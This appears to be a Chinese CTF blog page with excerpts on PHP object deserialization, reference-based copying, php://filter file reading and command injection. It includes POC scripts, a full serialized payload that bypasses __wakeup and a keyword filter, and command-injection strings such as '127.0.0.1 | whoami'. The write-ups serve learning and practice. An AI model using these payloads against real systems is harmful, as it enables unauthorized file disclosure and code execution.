<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $source;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $var = <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line"></span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str[<span class="string">"str"</span>] = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-image">
        <a href="/2020/03/18/php-bypass/" class="image is-7by1">
            <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
        </a>
    </div>
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/web/">web</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    9 分钟 读完 (大约 1344 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/18/php-bypass/">PHP积累</a>
            
        </h1>
        <div class="content">
            <h2 id="php-三种写法"><a href="#php-三种写法" class="headerlink" title="php 三种写法"></a>php 三种写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo (&quot;这是一个 PHP 语言的嵌入范例\n&quot;); ?&gt;</span><br><span class="line">&lt;?php echo(&quot;这是第二个 PHP 语言的嵌入范例\n&quot;); ?&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">echo (&quot;这是类似 JavaScript 及 VBScript 语法</span><br><span class="line">的 PHP 语言嵌入范例&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% echo (&quot;这是类似 ASP 嵌入语法的 PHP 范例&quot;); %&gt;</span><br></pre></td></tr></table></figure>

<p>php://filter简单理解：</p>
<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
<p>使用不同的参数可以达到不同的目的和效果：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>指定了你要筛选过滤的数据流</td>
<td>必选</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符”|”分割</td>
<td>可选</td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符”|“分割</td>
<td>可选</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
        </div>
        
        
        <div class="level is-mobile">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/03/18/php-bypass/#more">阅读更多</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/web/">web</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    11 分钟 读完 (大约 1592 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/">从两道题目浅谈PHP深浅拷贝</a>
            
        </h1>
        <div class="content">
            <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近才认认真真看完PHP，虽然还是有很多地方不会应用，因此想多看看有关PHP的题目，看到了两道和PHP深浅拷贝有关的题目，自己也把它搞懂吧。。</p>
<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p><strong>题一</strong>：南邮ctf的PHP反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目意图很简单，就是先设置了对象的一个属性的值，如果另一个属性的值和这个设置好的值相等，则得到flag，而<code>get_magic_quotes_gpc()</code>和<code>$pass=stripslashes($pass)</code>只是把加上的转义字符又给去掉，似乎对这个题没有什么影响。最初我以为<code>$o-&gt;secret = &quot;*&quot;</code>就是把这个属性的值设为<code>*</code>，其实是设置成了任意字符，那我们如何将这个满足<code>$o-&gt;secret === $o-&gt;enter</code>这里就要用到<code>PHP深浅拷贝</code>的知识。</p>
<p>我们举一个栗子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ex1 = <span class="keyword">new</span> Example(<span class="string">'test1'</span>);<span class="comment">// $ex1-&gt;name现在是：test1</span></span><br><span class="line">$ex2 = $ex1;<span class="comment">// $ex2-&gt;name现在是：test1</span></span><br><span class="line"></span><br><span class="line">$ex2-&gt;name = <span class="string">'test2'</span>;<span class="comment">// 这样修改一下之后，$ex1-&gt;name与$ex2-&gt;name都变为了：test2</span></span><br></pre></td></tr></table></figure>
<p>现在我们应该可以理解<code>对象间引用</code>的概念，他们就相当于是同一个类的同一个对象，PHP5默认通过引用传递对象，假设$obj1和$obj2是两个对象，使用<code>$obj1=$obj2</code>这样的方法复制出的对象是相互关联的，程序中想复制一个值与原来相同的对象，而<code>不希望目标对象与源对象关联</code>，应使用<code>clone</code>关键字。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ex1 = <span class="keyword">new</span> Example(<span class="string">'test1'</span>);<span class="comment">// $ex1-&gt;name现在是：test1</span></span><br><span class="line">$ex2 = <span class="keyword">clone</span> $ex1;<span class="comment">//$ex2-&gt;name现在是：test1</span></span><br><span class="line">$ex2-&gt;name = <span class="string">'test2'</span>;<span class="comment">//现在$ex1-&gt;name还是test1,而$ex2-&gt;name是test2</span></span><br></pre></td></tr></table></figure>
<p>这里看到，通过clone之后，$ex1与$ex2是两个不同的对象，他们拥有各自的变量环境。但是这里需要注意，在这两个对象内部，<code>拥有的是值类型的数据</code>，如果是内部<code>拥有的是引用类型</code>，那么通过clone得到的<code>新对象中的引用则仍然指向原引用</code></p>
<p>因此这里就引申出 <strong>浅复制</strong> 与 <strong>深复制</strong> 的概念：</p>
<blockquote>
<p><strong>浅复制</strong>： 使用clone来复制对象，这种复制叫做“浅复制“，被赋值对象的所有变量都还有与原来对象相同的值，而所有的<strong>对其他对象的引用都仍然指向原来的对象。</strong><br><strong>深复制</strong>：被复制的对象的所有的变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。</p>
</blockquote>
<p>而如果要进行深复制，应该在类中定义一个<code>__clone()</code>方法,在这个方法中完成对目标对象的属性赋以新值，这里就不过多赘述。</p>
<p>或者<code>利用串行化(冷藏与解冻)</code>，即序列化再反序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$tmp = serialize($ex1);</span><br><span class="line">$ex2 = unserialize($tmp);</span><br></pre></td></tr></table></figure>
<p>这样得到的$ex2就是一个全新的对象</p>
<p>最后要引出<code>&amp;</code>，属于浅拷贝，举个例子就能明白了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'crispr'</span>;</span><br><span class="line">$b = &amp;$a;</span><br><span class="line">$b = <span class="string">'crispr copy'</span>;</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//此时$a = 'crispr copy'</span></span><br></pre></td></tr></table></figure>
<p>类似传地址过去，其实它们的改变是完全同步的，或者说它们就是一体的。</p>
<p>因此PHP生成的POC如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $enter;</span><br><span class="line">      <span class="keyword">var</span> $secret;</span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;enter=&amp;<span class="keyword">$this</span>-&gt;secret; <span class="comment">//浅拷贝，它们的变化完全同步</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">echo</span> serialize(<span class="keyword">new</span> just4fun());</span><br><span class="line"> </span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>题二：</strong> 2019全国信息安全大赛 JustSoSo<br>  这里我是本地进行复现的，23333，只能分析一下PHP了和构造Poc，其他的文件包含读PHP就省去了。。。</p>
<p><code>hint.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>通过<code>GET</code>获取两个参数：<code>file</code>和<code>payload</code>。<br>Hint.php中有两个类<code>Flag</code>和<code>Handle</code>。主要是通过Handle来调用Flag的getFlag()函数。但在Handle中存在wakeup()函数，该函数会重置所有变量，导致传入的Flag类对象为空。这里可以利用<code>增加对象个数的方式</code>来绕过wakeup函数，增加对象个数时wakeup函数便会失效，这个是比较常见的。还要绕过一层：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们的<code>$file</code>是<code>flag.php</code>，而初始化后，<code>$this-&gt;token_flag = $this-&gt;token</code>，接着调用getFlag()方法后，重新设置了<code>$this-&gt;token_flag</code>，因此在这里也应该是要使用<code>&amp;</code>符号，令<code>$this-&gt;token_flag = &amp;$this-&gt;token</code>进行浅拷贝。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>此时还需要绕过<code>?payload=</code>不能出现flag,但是flag在<code>flag.php</code>中，在url多加斜杠即可,<code>///index.php?</code>此时PHP便不会解析成功了。<br>最终PHP的Poc如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">$o = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$oo = <span class="keyword">new</span> Handle($o);</span><br><span class="line">$ser = serialize($oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $ser;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终payload:<br><code>///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<p>注意Handle有私有变量，应该加上<code>%00</code></p>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T08:35:21.000Z">2020-03-18</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/web/">web</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    6 分钟 读完 (大约 951 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/18/ctfhub-RCE/">CTFhub RCE系列</a>
            
        </h1>
        <div class="content">
            <blockquote>
<p>今天介绍远程执行漏洞（其实想学反弹shell。</p>
<p>首先需要掌握几种常见的语句。</p>
</blockquote>
<p>　1、| ，&amp; ，&amp;&amp;，||等操作　　　　</p>
<pre><code>　　 （1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2

　　 （2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2

　　 （3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</code></pre><p>　　2、payload（&amp; / ‘ “ 空格等特殊符号需要时编码）</p>
<pre><code>　　　(1) cmd = 127.0.0.1 | whoami

　　　(2) cmd = 127.0.0.1 &amp; whoami

　　　(3) cmd = 127.0.0.1 &amp;&amp; whoami

　　　(4) cmd = `whoami`

　　　(5) cmd = &apos;/&quot;|whoami（这里意思是用&apos;/&quot;引号闭合前面 /-&gt;表示或）</code></pre><p>　　3、常用的命令</p>
<pre><code>　　 （1） 有回显的：whoami id（验证类）

　　　(2) 没有回显的：nslookup wget 等看请求、dnslog httplog等 （验证类）

